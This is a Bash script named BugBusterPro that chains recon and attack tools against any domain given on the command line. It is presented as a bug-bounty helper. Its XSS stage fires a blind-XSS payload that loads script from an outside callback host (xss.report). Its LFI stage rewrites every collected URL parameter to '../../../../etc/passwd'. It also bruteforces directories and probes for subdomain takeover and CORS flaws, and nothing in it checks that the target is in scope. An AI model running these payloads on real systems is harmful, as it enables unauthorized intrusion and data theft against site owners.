#!/bin/bash

# ----------------------------------------
# BugBusterPro - Bug Bounty Automation Tool
# ----------------------------------------

VERSION="1.0.0"
SCRIPT_NAME="BugBusterPro"

# ----------------------------------------
# Color definitions
# ----------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# ----------------------------------------
# Default values
# ----------------------------------------
DOMAIN=""
OUTPUT_DIR="$(pwd)/bugbusterpro_output"
FORCE=false
THREADS=50
CONTINUE_ON_ERROR=true
SHOW_BANNER=true
SILENT_MODE=false

# ----------------------------------------
# Banner function
# ----------------------------------------
show_banner() {
    if [ "$SHOW_BANNER" = true ]; then
        echo -e "${BLUE}${BOLD}"
        echo -e "██████╗ ██╗   ██╗ ██████╗ ██████╗ ██╗   ██╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗  ██████╗ "
        echo -e "██╔══██╗██║   ██║██╔════╝ ██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗"
        echo -e "██████╔╝██║   ██║██║  ███╗██████╔╝██║   ██║███████╗   ██║   █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║"
        echo -e "██╔══██╗██║   ██║██║   ██║██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██║   ██║"
        echo -e "██████╔╝╚██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║██║     ██║  ██║╚██████╔╝"
        echo -e "╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ "
        echo -e "${NC}"
        echo -e "${BOLD}${CYAN}                               All-in-One Bug Bounty Automation Tool${NC}"
        echo -e "${YELLOW}                                        Version: ${VERSION}${NC}"
        echo
    fi
}

# ----------------------------------------
# Helper functions
# ----------------------------------------
log_info() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] ${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] ${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] ${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] ${RED}[ERROR]${NC} $1" >&2
}

log_step() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] ${CYAN}[STEP]${NC} $1"
}

print_help() {
    echo -e "${BOLD}Usage:${NC}"
    echo -e "  ./$(basename "$0") --domain <target> [options]"
    echo
    echo -e "${BOLD}Required Arguments:${NC}"
    echo -e "  --domain <target>     Target domain to scan"
    echo
    echo -e "${BOLD}Options:${NC}"
    echo -e "  --output-dir <dir>    Output directory (default: ./bugbusterpro_output)"
    echo -e "  --force               Force rerun of all steps even if output exists"
    echo -e "  --threads <num>       Number of threads to use (default: 50)"
    echo -e "  --silent              Run in silent mode (less verbose output)"
    echo -e "  --no-banner           Don't display the banner"
    echo -e "  --help                Show this help message and exit"
    echo -e "  --version             Show version information"
    echo
    echo -e "${BOLD}Example:${NC}"
    echo -e "  ./$(basename "$0") --domain example.com --output-dir ./results --threads 100"
    exit 0
}

print_version() {
    echo -e "${SCRIPT_NAME} ${VERSION}"
    exit 0
}

check_required_args() {
    if [ -z "$DOMAIN" ]; then
        log_error "Missing required argument: --domain"
        echo
        print_help
        exit 1
    fi
}

# ----------------------------------------
# Function to check if a command exists
# ----------------------------------------
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# ----------------------------------------
# Install dependencies
# ----------------------------------------
install_dependencies() {
    log_step "Checking and installing required dependencies..."

    # Array of tools to check and install
    TOOLS=(
        "subfinder"
        "httpx"
        "katana"
        "waybackurls"
        "otxurls"
        "feroxbuster"
        "nuclei"
        "subzy"
        "qsreplace"
        "gf"
        "bxss"
    )

    # Check for go installation
    if ! command_exists go; then
        log_info "Installing Go..."
        wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz -O /tmp/go.tar.gz
        sudo tar -C /usr/local -xzf /tmp/go.tar.gz
        echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc
        export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin
        rm /tmp/go.tar.gz
        log_success "Go installed successfully"
    fi

    # Create go/bin directory if it doesn't exist
    mkdir -p ~/go/bin

    # Make sure our PATH includes go/bin
    export PATH=$PATH:$HOME/go/bin

    # Install needed apt packages
    log_info "Installing required system packages..."
    sudo apt-get update
    sudo apt-get install -y git wget curl python3 python3-pip unzip libpcap-dev

    # Install python dependencies (for corsy)
    pip3 install requests

    # Install each tool if not already installed
    for tool in "${TOOLS[@]}"; do
        if ! command_exists "$tool"; then
            log_info "Installing $tool..."

            case "$tool" in
                "subfinder")
                    go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
                    ;;
                "httpx")
                    go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
                    ;;
                "katana")
                    go install github.com/projectdiscovery/katana/cmd/katana@latest
                    ;;
                "waybackurls")
                    go install github.com/tomnomnom/waybackurls@latest
                    ;;
                "otxurls")
                    go install github.com/lc/otxurls@latest
                    ;;
                "feroxbuster")
                    curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash
                    mv feroxbuster $HOME/go/bin/
                    ;;
                "nuclei")
                    go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
                    # Install nuclei templates
                    if [ ! -d "/opt/nuclei-templates" ]; then
                        sudo mkdir -p /opt/nuclei-templates
                        nuclei -update-templates
                    fi
                    ;;
                "subzy")
                    go install -v github.com/LukaSikic/subzy@latest
                    ;;
                "qsreplace")
                    go install github.com/tomnomnom/qsreplace@latest
                    ;;
                "gf")
                    go install github.com/tomnomnom/gf@latest
                    # Install gf patterns
                    if [ ! -d "$HOME/.gf" ]; then
                        mkdir -p "$HOME/.gf"
                        git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf/
                    fi
                    ;;
                "bxss")
                    go install github.com/ethicalhackingplayground/bxss@latest
                    ;;
                "corsy")
                    if [ ! -d "$HOME/tools" ]; then
                        mkdir -p "$HOME/tools"
                    fi
                    if [ ! -d "$HOME/tools/Corsy" ]; then
                        git clone https://github.com/s0md3v/Corsy.git "$HOME/tools/Corsy"
                    fi
                    ;;
            esac

            if command_exists "$tool"; then
                log_success "$tool installed successfully"
            else
                log_error "Failed to install $tool"
                if [ "$CONTINUE_ON_ERROR" = false ]; then
                    exit 1
                fi
            fi
        else
            log_info "$tool is already installed"
        fi
    done

    # Set up corsy.py if missing
    if [ ! -f "/usr/local/bin/corsy.py" ]; then
        if [ ! -d "$HOME/tools/Corsy" ]; then
            git clone https://github.com/s0md3v/Corsy.git "$HOME/tools/Corsy"
        fi
        sudo ln -s "$HOME/tools/Corsy/corsy.py" /usr/local/bin/corsy.py
        sudo chmod +x /usr/local/bin/corsy.py
    fi

    log_success "All dependencies installed successfully"
}

# ----------------------------------------
# Create directory structure
# ----------------------------------------
create_directory_structure() {
    log_step "Creating directory structure..."

    # Create main directories
    mkdir -p "$OUTPUT_DIR"/{subfinder,httpx,urls,js,findings,logs}

    log_success "Directory structure created: $OUTPUT_DIR"
}

# ----------------------------------------
# Run subdomain discovery
# ----------------------------------------
run_subdomain_discovery() {
    local output_file="$OUTPUT_DIR/subfinder/subdomains.txt"

    if [ -f "$output_file" ] && [ "$FORCE" = false ]; then
        log_warning "Subdomain file already exists. Skipping subdomain discovery. Use --force to rerun."
        return 0
    fi

    log_step "Running subdomain discovery for $DOMAIN..."

    if ! subfinder -d "$DOMAIN" -all -recursive > "$output_file"; then
        log_error "Failed to run subfinder"
        return 1
    fi

    local count=$(wc -l < "$output_file")
    log_success "Subdomain discovery completed. Found $count subdomains."

    return 0
}

# ----------------------------------------
# Run subdomain probing
# ----------------------------------------
run_subdomain_probing() {
    local input_file="$OUTPUT_DIR/subfinder/subdomains.txt"
    local output_file="$OUTPUT_DIR/httpx/alive.txt"

    if [ ! -f "$input_file" ]; then
        log_error "Subdomain file not found. Run subdomain discovery first."
        return 1
    fi

    if [ -f "$output_file" ] && [ "$FORCE" = false ]; then
        log_warning "Alive hosts file already exists. Skipping subdomain probing. Use --force to rerun."
        return 0
    fi

    log_step "Probing subdomains for alive hosts..."

    if ! cat "$input_file" | httpx -ports 80,443,8000,8008,8888 -threads "$THREADS" > "$output_file"; then
        log_error "Failed to probe subdomains with httpx"
        return 1
    fi

    local count=$(wc -l < "$output_file")
    log_success "Subdomain probing completed. Found $count alive hosts."

    return 0
}

# ----------------------------------------
# Run URL collection
# ----------------------------------------
run_url_collection() {
    local input_file="$OUTPUT_DIR/httpx/alive.txt"
    local katana_output="$OUTPUT_DIR/urls/katana.txt"
    local wayback_output="$OUTPUT_DIR/urls/wayback.txt"
    local otx_output="$OUTPUT_DIR/urls/otx.txt"
    local all_urls="$OUTPUT_DIR/urls/all.txt"

    if [ ! -f "$input_file" ]; then
        log_error "Alive hosts file not found. Run subdomain probing first."
        return 1
    fi

    if [ -f "$all_urls" ] && [ "$FORCE" = false ]; then
        log_warning "URL collection already exists. Skipping URL collection. Use --force to rerun."
        return 0
    fi

    log_step "Collecting URLs from multiple sources..."

    log_info "Running katana..."
    if ! katana -u "$input_file" -d 5 -jc -ef woff,css,svg,js,png,jpg,woff2,jpeg,gif -o "$katana_output"; then
        log_error "Failed to run katana"
    else
        log_success "Katana completed"
    fi

    log_info "Running waybackurls..."
    if ! waybackurls "$DOMAIN" > "$wayback_output"; then
        log_error "Failed to run waybackurls"
    else
        log_success "Waybackurls completed"
    fi

    log_info "Running otxurls..."
    if ! otxurls "$DOMAIN" > "$otx_output"; then
        log_error "Failed to run otxurls"
    else
        log_success "OTXurls completed"
    fi

    log_info "Merging and deduplicating URLs..."
    sort -u "$OUTPUT_DIR"/urls/*.txt -o "$all_urls"

    local count=$(wc -l < "$all_urls")
    log_success "URL collection completed. Collected $count unique URLs."

    return 0
}

# ----------------------------------------
# Run secret files discovery
# ----------------------------------------
run_secret_files_discovery() {
    local input_file="$OUTPUT_DIR/urls/all.txt"
    local output_file="$OUTPUT_DIR/findings/secrets.txt"

    if [ ! -f "$input_file" ]; then
        log_error "URL collection file not found. Run URL collection first."
        return 1
    fi

    if [ -f "$output_file" ] && [ "$FORCE" = false ]; then
        log_warning "Secret files discovery already exists. Skipping secret files discovery. Use --force to rerun."
        return 0
    fi

    log_step "Discovering potential secret files..."

    if ! cat "$input_file" | grep -Ei "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config" > "$output_file"; then
        log_error "Failed to discover secret files"
        return 1
    fi

    local count=$(wc -l < "$output_file")
    log_success "Secret files discovery completed. Found $count potential secret files."

    return 0
}

# ----------------------------------------
# Run JavaScript reconnaissance
# ----------------------------------------
run_js_recon() {
    local input_file="$OUTPUT_DIR/urls/all.txt"
    local js_file="$OUTPUT_DIR/js/js.txt"
    local js_findings="$OUTPUT_DIR/findings/js_findings.txt"
    local js_katana_findings="$OUTPUT_DIR/findings/js_katana_findings.txt"

    if [ ! -f "$input_file" ]; then
        log_error "URL collection file not found. Run URL collection first."
        return 1
    fi

    if [ -f "$js_findings" ] && [ -f "$js_katana_findings" ] && [ "$FORCE" = false ]; then
        log_warning "JavaScript reconnaissance already exists. Skipping JavaScript reconnaissance. Use --force to rerun."
        return 0
    fi

    log_step "Running JavaScript reconnaissance..."

    log_info "Extracting JavaScript files..."
    if ! cat "$input_file" | grep -Ei "\.js$" > "$js_file"; then
        log_error "Failed to extract JavaScript files"
    else
        local js_count=$(wc -l < "$js_file")
        log_success "Extracted $js_count JavaScript files"
    fi

    log_info "Scanning JavaScript files with nuclei..."
    if ! cat "$js_file" | nuclei -t /opt/nuclei-templates/http/exposures/ -o "$js_findings" 2>/dev/null; then
        log_error "Failed to scan JavaScript files with nuclei"
    else
        log_success "JavaScript nuclei scan completed"
    fi

    log_info "Running katana passive scan for JavaScript files..."
    if ! echo "$DOMAIN" | katana -ps | grep -Ei "\.js$" | nuclei -t /opt/nuclei-templates/http/exposures/ -c 30 -o "$js_katana_findings" 2>/dev/null; then
        log_error "Failed to run katana passive scan"
    else
        log_success "Katana passive scan completed"
    fi

    log_success "JavaScript reconnaissance completed"

    return 0
}

# ----------------------------------------
# Run directory bruteforce
# ----------------------------------------
run_directory_bruteforce() {
    local input_file="$OUTPUT_DIR/httpx/alive.txt"
    local output_file="$OUTPUT_DIR/urls/feroxbuster.txt"

    if [ ! -f "$input_file" ]; then
        log_error "Alive hosts file not found. Run subdomain probing first."
        return 1
    fi

    if [ -f "$output_file" ] && [ "$FORCE" = false ]; then
        log_warning "Directory bruteforce already exists. Skipping directory bruteforce. Use --force to rerun."
        return 0
    fi

    log_step "Running directory bruteforce..."

    # Check if seclist is installed
    if [ ! -d "/snap/seclists" ]; then
        log_info "Installing SecLists..."
        sudo apt-get install -y seclists
    fi

    # Check if feroxbuster exists
    if ! command_exists feroxbuster; then
        log_error "feroxbuster not found. Please install it manually."
        return 1
    fi

    if ! cat "$input_file" | feroxbuster --stdin \
    -w /snap/seclists/current/Discovery/Web-Content/raft-medium-directories.txt \
    -x php,config,log,sql,bak,old,conf,backup,sub,db,asp,aspx,py,rb,cache,cgi,csv,htm,inc,jar,js,json,jsp,lock,rar,swp,txt,wadl,xml,tar.bz2,tar.gz \
    --depth 3 -t 100 -C 404,403 --redirects \
    --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
    --auto-tune --scan-limit 10 --no-recursion --collect-backups --collect-extensions \
    -o "$output_file"; then
        log_error "Failed to run directory bruteforce"
        return 1
    fi

    log_success "Directory bruteforce completed"

    return 0
}

# ----------------------------------------
# Run XSS scanning
# ----------------------------------------
run_xss_scanning() {
    local output_file="$OUTPUT_DIR/findings/xss.txt"

    if [ -f "$output_file" ] && [ "$FORCE" = false ]; then
        log_warning "XSS scanning already exists. Skipping XSS scanning. Use --force to rerun."
        return 0
    fi

    log_step "Running XSS scanning..."

    if ! subfinder -d "$DOMAIN" | httpx -silent -ports 80,443,8080,8443 | \
    katana -f qurl -jc | gf xss | bxss -a -p "<script/src=//xss.report/c/coffinpx></script>" -t -c 50 > "$output_file" 2>/dev/null; then
        log_error "Failed to run XSS scanning"
        return 1
    fi

    log_success "XSS scanning completed"

    return 0
}

# ----------------------------------------
# Run subdomain takeover check
# ----------------------------------------
run_subdomain_takeover() {
    local input_file="$OUTPUT_DIR/subfinder/subdomains.txt"
    local output_file="$OUTPUT_DIR/findings/takeovers.txt"

    if [ ! -f "$input_file" ]; then
        log_error "Subdomain file not found. Run subdomain discovery first."
        return 1
    fi

    if [ -f "$output_file" ] && [ "$FORCE" = false ]; then
        log_warning "Subdomain takeover check already exists. Skipping subdomain takeover check. Use --force to rerun."
        return 0
    fi

    log_step "Running subdomain takeover check..."

    if ! subzy run --targets "$input_file" --concurrency 100 --hide_fails --verify_ssl > "$output_file"; then
        log_error "Failed to run subdomain takeover check"
        return 1
    fi

    log_success "Subdomain takeover check completed"

    return 0
}

# ----------------------------------------
# Run CORS scanner
# ----------------------------------------
run_cors_scanner() {
    local input_file="$OUTPUT_DIR/httpx/alive.txt"
    local output_file="$OUTPUT_DIR/findings/cors.txt"

    if [ ! -f "$input_file" ]; then
        log_error "Alive hosts file not found. Run subdomain probing first."
        return 1
    fi

    if [ -f "$output_file" ] && [ "$FORCE" = false ]; then
        log_warning "CORS scanner already exists. Skipping CORS scanner. Use --force to rerun."
        return 0
    fi

    log_step "Running CORS scanner..."

    # Check if corsy.py exists
    if [ ! -f "/usr/local/bin/corsy.py" ]; then
        if [ ! -d "$HOME/tools/Corsy" ]; then
            git clone https://github.com/s0md3v/Corsy.git "$HOME/tools/Corsy"
        fi
        sudo ln -s "$HOME/tools/Corsy/corsy.py" /usr/local/bin/corsy.py
        sudo chmod +x /usr/local/bin/corsy.py
    fi

    if ! python3 /usr/local/bin/corsy.py -i "$input_file" -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked" > "$output_file" 2>/dev/null; then
        log_error "Failed to run CORS scanner"
        return 1
    fi

    log_success "CORS scanner completed"

    return 0
}

# ----------------------------------------
# Run misconfig and exposure scan
# ----------------------------------------
run_misconfig_scan() {
    local input_file="$OUTPUT_DIR/httpx/alive.txt"
    local output_file="$OUTPUT_DIR/findings/misconfigs.json"

    if [ ! -f "$input_file" ]; then
        log_error "Alive hosts file not found. Run subdomain probing first."
        return 1
    fi

    if [ -f "$output_file" ] && [ "$FORCE" = false ]; then
        log_warning "Misconfig scan already exists. Skipping misconfig scan. Use --force to rerun."
        return 0
    fi

    log_step "Running misconfig and exposure scan..."

    if ! nuclei -l "$input_file" \
    -t /opt/nuclei-templates/ \
    -tags cors,misconfig \
    -rate-limit 150 -c 50 -mhe 50 -timeout 15 \
    -severity medium,high,critical \
    -iserver https://your-interactsh-server.com \
    -j -stats -irr -validate \
    -o "$output_file"; then
        log_error "Failed to run misconfig scan"
        return 1
    fi

    log_success "Misconfig and exposure scan completed"

    return 0
}

# ----------------------------------------
# Run CVE and technology fingerprinting
# ----------------------------------------
run_cve_scan() {
    local input_file="$OUTPUT_DIR/httpx/alive.txt"
    local output_file="$OUTPUT_DIR/findings/nuclei_findings.json"

    if [ ! -f "$input_file" ]; then
        log_error "Alive hosts file not found. Run subdomain probing first."
        return 1
    fi

    if [ -f "$output_file" ] && [ "$FORCE" = false ]; then
        log_warning "CVE scan already exists. Skipping CVE scan. Use --force to rerun."
        return 0
    fi

    log_step "Running CVE and technology fingerprinting..."

    if ! nuclei -list "$input_file" -tags cve,osint,tech -o "$output_file"; then
        log_error "Failed to run CVE scan"
        return 1
    fi

    log_success "CVE and technology fingerprinting completed"

    return 0
}

# ----------------------------------------
# Run LFI testing
# ----------------------------------------
run_lfi_testing() {
    local input_file="$OUTPUT_DIR/urls/all.txt"
    local output_file="$OUTPUT_DIR/findings/lfi.json"

    if [ ! -f "$input_file" ]; then
        log_error "URL collection file not found. Run URL collection first."
        return 1
    fi

    if [ -f "$output_file" ] && [ "$FORCE" = false ]; then
        log_warning "LFI testing already exists. Skipping LFI testing. Use --force to rerun."
        return 0
    fi

    log_step "Running LFI testing..."

    if ! cat "$input_file" | grep -E '\.php\?|\.asp\?|\.jsp\?|file=|page=' | \
    qsreplace "../../../../etc/passwd" | \
    nuclei -t /opt/nuclei-templates/vulnerabilities/ \
    -tags lfi,file-inclusion -headless -system-chrome \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    -rate-limit 50 -c 30 -timeout 10 \
    -iserver https://your-interactsh-server.com \
    -validate \
    -severity medium,high,critical -irr -j -o "$output_file"; then
        log_error "Failed to run LFI testing"
        return 1
    fi

    log_success "LFI testing completed"

    return 0
}

# ----------------------------------------
# Generate report
# ----------------------------------------
generate_report() {
    local report_file="$OUTPUT_DIR/BugBusterPro_Report.md"

    log_step "Generating summary report..."

    # Create report header
    cat > "$report_file" << EOL
# BugBusterPro Scan Report

## Target: $DOMAIN
## Date: $(date '+%Y-%m-%d %H:%M:%S')

## Summary

EOL

    # Add subdomain statistics
    if [ -f "$OUTPUT_DIR/subfinder/subdomains.txt" ]; then
        local subdomain_count=$(wc -l < "$OUTPUT_DIR/subfinder/subdomains.txt")
        echo "- Total subdomains discovered: $subdomain_count" >> "$report_file"
    fi

    # Add alive hosts statistics
    if [ -f "$OUTPUT_DIR/httpx/alive.txt" ]; then
        local alive_count=$(wc -l < "$OUTPUT_DIR/httpx/alive.txt")
        echo "- Total alive hosts: $alive_count" >> "$report_file"
    fi

    # Add URL statistics
    if [ -f "$OUTPUT_DIR/urls/all.txt" ]; then
        local url_count=$(wc -l < "$OUTPUT_DIR/urls/all.txt")
        echo "- Total unique URLs: $url_count" >> "$report_file"
    fi

    # Add JavaScript files statistics
    if [ -f "$OUTPUT_DIR/js/js.txt" ]; then
        local js_count=$(wc -l < "$OUTPUT_DIR/js/js.txt")
        echo "- Total JavaScript files: $js_count" >> "$report_file"
    fi

    # Add potential findings
    echo -e "\n## Potential Findings\n" >> "$report_file"

    # Check for subdomain takeovers
    if [ -f "$OUTPUT_DIR/findings/takeovers.txt" ] && [ -s "$OUTPUT_DIR/findings/takeovers.txt" ]; then
        echo "### Subdomain Takeover Vulnerabilities" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$OUTPUT_DIR/findings/takeovers.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi

    # Check for CORS issues
    if [ -f "$OUTPUT_DIR/findings/cors.txt" ] && [ -s "$OUTPUT_DIR/findings/cors.txt" ]; then
        echo "### CORS Misconfigurations" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$OUTPUT_DIR/findings/cors.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi

    # Check for secrets
    if [ -f "$OUTPUT_DIR/findings/secrets.txt" ] && [ -s "$OUTPUT_DIR/findings/secrets.txt" ]; then
        local secrets_count=$(wc -l < "$OUTPUT_DIR/findings/secrets.txt")
        echo "### Potential Secret Files ($secrets_count)" >> "$report_file"
        echo "See the full list in: \`$OUTPUT_DIR/findings/secrets.txt\`" >> "$report_file"
        echo "" >> "$report_file"
        echo "First 10 entries:" >> "$report_file"
        echo '```' >> "$report_file"
        head -n 10 "$OUTPUT_DIR/findings/secrets.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi

    # Check for XSS findings
    if [ -f "$OUTPUT_DIR/findings/xss.txt" ] && [ -s "$OUTPUT_DIR/findings/xss.txt" ]; then
        echo "### Potential XSS Vulnerabilities" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$OUTPUT_DIR/findings/xss.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi

    # Check for JavaScript findings
    if [ -f "$OUTPUT_DIR/findings/js_findings.txt" ] && [ -s "$OUTPUT_DIR/findings/js_findings.txt" ]; then
        echo "### JavaScript Security Issues" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$OUTPUT_DIR/findings/js_findings.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi

    # Check for misconfiguration findings
    if [ -f "$OUTPUT_DIR/findings/misconfigs.json" ] && [ -s "$OUTPUT_DIR/findings/misconfigs.json" ]; then
        echo "### Security Misconfigurations" >> "$report_file"
        echo "See the full details in: \`$OUTPUT_DIR/findings/misconfigs.json\`" >> "$report_file"
    fi

    # Check for nuclei findings
    if [ -f "$OUTPUT_DIR/findings/nuclei_findings.json" ] && [ -s "$OUTPUT_DIR/findings/nuclei_findings.json" ]; then
        echo "### CVE and Technology Findings" >> "$report_file"
        echo "See the full details in: \`$OUTPUT_DIR/findings/nuclei_findings.json\`" >> "$report_file"
    fi

    # Check for LFI findings
    if [ -f "$OUTPUT_DIR/findings/lfi.json" ] && [ -s "$OUTPUT_DIR/findings/lfi.json" ]; then
        echo "### Local File Inclusion Vulnerabilities" >> "$report_file"
        echo "See the full details in: \`$OUTPUT_DIR/findings/lfi.json\`" >> "$report_file"
    fi

    # Add conclusion
    echo -e "\n## Conclusion" >> "$report_file"
    echo -e "This report was automatically generated by BugBusterPro v$VERSION." >> "$report_file"
    echo -e "Please review the findings and verify them manually before reporting." >> "$report_file"

    log_success "Report generated: $report_file"

    return 0
}

# ----------------------------------------
# Parse command line arguments
# ----------------------------------------
parse_arguments() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --domain)
                DOMAIN="$2"
                shift 2
                ;;
            --output-dir)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            --force)
                FORCE=true
                shift
                ;;
            --threads)
                THREADS="$2"
                shift 2
                ;;
            --silent)
                SILENT_MODE=true
                shift
                ;;
            --no-banner)
                SHOW_BANNER=false
                shift
                ;;
            --help)
                print_help
                ;;
            --version)
                print_version
                ;;
            *)
                log_error "Unknown option: $1"
                print_help
                ;;
        esac
    done
}

# ----------------------------------------
# Main function
# ----------------------------------------
main() {
    parse_arguments "$@"
    check_required_args
    show_banner

    # Create output directory if it doesn't exist
    if [ ! -d "$OUTPUT_DIR" ]; then
        mkdir -p "$OUTPUT_DIR"
    fi

    # Run each step
    install_dependencies
    create_directory_structure

    run_subdomain_discovery
    run_subdomain_probing
    run_url_collection
    run_secret_files_discovery
    run_js_recon
    run_directory_bruteforce
    run_xss_scanning
    run_subdomain_takeover
    run_cors_scanner
    run_misconfig_scan
    run_cve_scan
    run_lfi_testing

    generate_report

    log_success "BugBusterPro scan completed for $DOMAIN"
    log_info "Report available at: $OUTPUT_DIR/BugBusterPro_Report.md"
}

# Run main function with all arguments
main "$@"
